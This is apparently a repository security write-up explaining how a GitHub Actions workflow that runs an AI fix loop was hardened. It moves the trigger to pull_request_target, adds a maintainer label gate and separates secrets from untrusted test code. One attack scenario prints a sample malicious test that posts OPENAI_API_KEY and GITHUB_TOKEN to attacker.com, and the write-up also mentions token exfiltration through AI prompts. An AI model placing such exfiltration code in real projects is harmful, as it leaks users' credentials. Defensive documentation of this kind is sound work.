# Security Fix: AI Loop Fixer Workflow

## Vulnerability Summary
The original `ai-loop-fixer.yml` workflow had a critical security vulnerability where untrusted code from `ai-fix-/*` branches could execute with access to sensitive secrets (`OPENAI_API_KEY` and `GITHUB_TOKEN`) and repository write permissions.

## Root Cause
1. **Push-triggered workflow**: Triggered on any push to `ai-fix-/*` branches, allowing any contributor to trigger it
2. **Branch-controlled workflow**: The workflow definition came from the pushed branch (untrusted)
3. **Secrets exposed to untrusted code**: Both `OPENAI_API_KEY` and `GITHUB_TOKEN` were exposed to:
   - `npm ci` / `pip install` (could execute malicious package scripts)
   - `npm test` / `pytest` (could execute malicious test code)
   - Shell scripts (could be modified in attacker's branch)
4. **Write permissions**: Job had `contents: write` permission
5. **Automatic commits**: Workflow automatically committed and pushed changes without review

## Security Improvements

### 1. Changed Trigger Mechanism
- **Before**: `push` on `ai-fix-/*` branches
- **After**: `pull_request_target` with explicit label requirement
- **Benefit**: Workflow runs from default branch (trusted code), not from PR branch

### 2. Added Authorization Gate
- New `authorize` job checks if PR has `ai-fix-approved` label
- Only maintainers can add this label
- Prevents arbitrary execution by any contributor

### 3. Separated Trust Boundaries
Created two separate jobs:

#### Job 1: `test-untrusted-code`
- Runs untrusted code (tests, dependencies)
- **NO secrets exposed** (no `OPENAI_API_KEY`, no `GITHUB_TOKEN`)
- **Read-only permissions** (`contents: read`)
- Uploads test results as artifact (data only, no code)

#### Job 2: `analyze-and-fix`
- Has access to secrets (`OPENAI_API_KEY`)
- Has write permissions (`contents: write`, `pull-requests: write`)
- **Does NOT execute untrusted project code**
- Only executes trusted `aider` CLI with test results as input
- Workflow definition comes from default branch (trusted)

### 4. Removed GITHUB_TOKEN from AI Context
- `GITHUB_TOKEN` is no longer exposed to the AI fix loop
- Only used by GitHub Actions for PR comments
- Prevents token exfiltration through AI prompts

### 5. Changed to Pull Request Model
- **Before**: Direct push to branch
- **After**: Updates PR for review
- **Benefit**: All AI-generated changes must be reviewed before merge

### 6. Fixed Runtime Environment
- Changed from Node.js to Python (correct for this project)
- Uses `pytest` instead of `npm test`
- Properly installs Python dependencies

### 7. Reduced Attack Surface
- Reduced `MAX_ATTEMPTS` from 5 to 3
- Added PR comment with results for transparency
- Workflow always runs from trusted revision

## Attack Scenarios Mitigated

### Scenario 1: Credential Exfiltration
**Before**: Attacker pushes branch with malicious test that reads and exfiltrates `OPENAI_API_KEY` and `GITHUB_TOKEN`
```python
# malicious test_exploit.py
import os
import requests
requests.post('https://attacker.com/steal', data={
    'openai': os.environ['OPENAI_API_KEY'],
    'github': os.environ['GITHUB_TOKEN']
})
```
**After**: Test runs without any secrets in environment. Attack fails.

### Scenario 2: Malicious Workflow Modification
**Before**: Attacker modifies workflow in their branch to execute arbitrary commands with secrets
**After**: Workflow runs from default branch only. Attacker's workflow changes are ignored.

### Scenario 3: Unauthorized Repository Changes
**Before**: Attacker pushes branch that passes tests but includes backdoor, which gets auto-committed
**After**: Requires `ai-fix-approved` label from maintainer. Changes go to PR for review.

### Scenario 4: Package Installation Exploits
**Before**: Attacker adds malicious package with install script that reads secrets
**After**: Package installation happens in separate job without secrets.

## Migration Guide

### For Repository Maintainers
1. Remove any existing `ai-fix-/*` branches
2. Update documentation to use pull request workflow instead
3. Create `ai-fix-approved` label in repository
4. Review and approve PRs before adding the label

### For Contributors
1. Create a pull request instead of pushing to `ai-fix-/*` branch
2. Request maintainer to add `ai-fix-approved` label if AI fixes are needed
3. Review AI-generated changes in the PR before merging

## Verification
The fix can be verified by:
1. Creating a PR with failing tests
2. Adding `ai-fix-approved` label (as maintainer)
3. Observing that workflow runs from default branch
4. Confirming test execution has no secrets in environment
5. Confirming AI fixes are pushed to PR for review

## References
- GitHub Security Best Practices: https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
- pull_request_target documentation: https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target
